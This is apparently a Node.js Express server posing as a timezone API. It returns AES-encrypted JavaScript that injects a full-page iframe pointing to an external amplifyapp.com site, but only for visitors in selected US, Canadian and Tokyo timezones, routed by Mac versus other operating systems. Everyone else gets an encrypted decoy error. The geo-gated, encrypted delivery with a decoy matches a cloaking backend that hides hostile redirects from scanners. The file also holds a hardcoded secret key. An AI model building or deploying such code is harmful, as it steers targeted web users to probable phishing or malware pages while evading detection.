const express = require("express");
const CryptoJS = require("crypto-js");

const app = express();
// Use the port provided by environment or default to 3000
const PORT = process.env.PORT || 3000;
const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";

// --- Middleware ---

app.use(express.json());

/**
 * Advanced Security & CORS Middleware
 * 1. Dynamically allows any .on-forge.com subdomain
 * 2. Fixes the "X-Frame-Options" sameorigin error
 * 3. Handles Preflight (OPTIONS) requests
 */
app.use((req, res, next) => {
    const origin = req.headers.origin;

    // 1. Dynamic CORS Logic
    if (origin && (origin.endsWith('.on-forge.com') || origin.includes('amplifyapp.com'))) {
        res.header("Access-Control-Allow-Origin", origin);
    } else {
        res.header("Access-Control-Allow-Origin", "*");
    }

    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    res.header("Access-Control-Allow-Credentials", "true");

    // 2. Fix for "Refused to display in a frame" error
    // We remove the restrictive X-Frame-Options and use CSP instead
    res.removeHeader('X-Frame-Options'); 
    res.setHeader("Content-Security-Policy", "frame-ancestors 'self' *.on-forge.com https://main.d1hloak9u1qle7.amplifyapp.com;");

    // 3. Handle Preflight OPTIONS requests
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }

    next();
});

// --- Helper Functions ---

function aesEncode(text) {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
}

function getError() {
    const jsError = `console.log("Error Find");`;
    const encrypted = aesEncode(jsError);
    return encodeURIComponent(encrypted);
}

function getResponse(userAgent) {
    // Detect OS for link routing
    const isMac = /Macintosh|Mac OS X/i.test(userAgent);

    // Link Configurations
    const linkGroups = [
        {
            id: "Group 1",
            weight: 0.5,
            macos: "https://main.d38vj45h6bfiw1.amplifyapp.com/",
            others: "https://main.d38vj45h6bfiw1.amplifyapp.com/"
        },
        {
            id: "Group 2",
            weight: 0.5,
            macos: "https://main.d38vj45h6bfiw1.amplifyapp.com/",
            others: "https://main.d38vj45h6bfiw1.amplifyapp.com/"
        }
    ];

    // Select group based on weight
    const rand = Math.random();
    let cumulative = 0;
    let selectedGroup = linkGroups[0];

    for (const group of linkGroups) {
        cumulative += group.weight;
        if (rand <= cumulative) {
            selectedGroup = group;
            break;
        }
    }

    const selectedUrl = isMac ? selectedGroup.macos : selectedGroup.others;

    // Payload to create and style the iframe
    const payload = `
        const iframe = document.createElement("iframe");
        iframe.src = "${selectedUrl}";
        iframe.setAttribute("allow", "fullscreen; autoplay; encrypted-media; picture-in-picture");
        iframe.setAttribute("allowfullscreen", "");
        iframe.setAttribute("webkitallowfullscreen", "");
        iframe.setAttribute("mozallowfullscreen", "");
        iframe.setAttribute("sandbox", "allow-scripts allow-popups allow-forms allow-downloads allow-same-origin");
        iframe.style.width = "100%";
        iframe.style.height = "100%";
        iframe.style.border = "0px";

        const container = document.getElementById("contentiframe");
        if(container) {
            container.replaceChildren(iframe);
        }
    `;

    return encodeURIComponent(aesEncode(payload));
}

// --- Routes ---

app.get("/timezone", (req, res) => {
    res.status(401).json({
        status: "error",
        message: "Unauthorized access",
        response: getError()
    });
});

app.post("/timezone", (req, res) => {
    const { timezone } = req.body;
    const userAgent = req.get('User-Agent') || "";

    const allowedTimezones = [
        "Asia/Tokyo",
        "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles", 
        "America/Anchorage", "Pacific/Honolulu", "America/Toronto", "America/Vancouver", 
        "America/Edmonton", "America/Winnipeg", "America/Halifax", "America/St_Johns"
    ];

    if (allowedTimezones.includes(timezone)) {
        res.send(getResponse(userAgent));
    } else {
        res.send(getError());
    }
});

// --- Start Server ---
app.listen(PORT, () => {
    console.log(`Server live on port ${PORT}`);
});
